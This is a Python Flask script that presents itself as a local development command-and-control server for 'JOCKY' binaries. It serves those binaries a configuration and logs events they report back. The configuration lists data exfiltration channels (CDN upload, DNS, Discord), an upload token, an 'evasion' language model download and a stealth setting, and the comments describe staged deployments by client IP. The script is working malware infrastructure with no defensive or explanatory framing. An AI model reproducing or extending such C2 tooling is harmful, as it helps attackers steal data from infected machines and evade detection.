#!/usr/bin/env python3
"""
JOCKY Local Development C2 Server
Responds to configuration requests from compiled binaries
"""

from flask import Flask, jsonify, request
import json
import os
from datetime import datetime

app = Flask(__name__)

# Configuration that gets sent to binaries
CONFIG = {
    "cdn_endpoint": "http://jocky-cdn:80/upload",
    "cdn_token": "Bearer local_development_token_xyz_123",
    "model_url": "http://jocky-models/models/phi3_evasion_linux.gguf",
    "model_hash": "sha256:local_development_hash",
    "exfil_channels": ["cdn", "dns", "discord"],
    "max_operations": 1000,
    "timeout_ms": 60000,
    "stealth_level": "development"
}

@app.route('/api/config', methods=['GET', 'POST'])
def get_config():
    """
    Main C2 configuration endpoint
    Binaries query this to get deployment configuration
    """
    client_ip = request.remote_addr
    timestamp = datetime.now().isoformat()

    print(f"[C2] Config request from {client_ip} at {timestamp}")

    # You could add logic here to return different configs based on:
    # - Build ID from query params
    # - Client IP
    # - Timestamp (staged deployments)

    return jsonify(CONFIG), 200

@app.route('/api/status', methods=['GET'])
def status():
    """Health check endpoint"""
    return jsonify({
        "status": "online",
        "timestamp": datetime.now().isoformat(),
        "environment": "local_development"
    }), 200

@app.route('/api/log', methods=['POST'])
def log_event():
    """
    Binaries can log events here during execution
    Useful for debugging local builds
    """
    data = request.get_json()
    timestamp = datetime.now().isoformat()

    print(f"[C2] Event from binary at {timestamp}:")
    print(f"    Build ID: {data.get('build_id', 'unknown')}")
    print(f"    Event: {data.get('event', 'unknown')}")
    print(f"    Details: {data.get('details', '')}")

    return jsonify({"status": "logged"}), 200

if __name__ == '__main__':
    print("=" * 60)
    print("JOCKY Local Development C2 Server")
    print("=" * 60)
    print(f"Listening on http://0.0.0.0:5000")
    print(f"Configuration endpoint: /api/config")
    print(f"Status endpoint: /api/status")
    print(f"Logging endpoint: /api/log")
    print()
    print("Configuration being served:")
    print(json.dumps(CONFIG, indent=2))
    print("=" * 60)

    app.run(host='0.0.0.0', port=5000, debug=True)
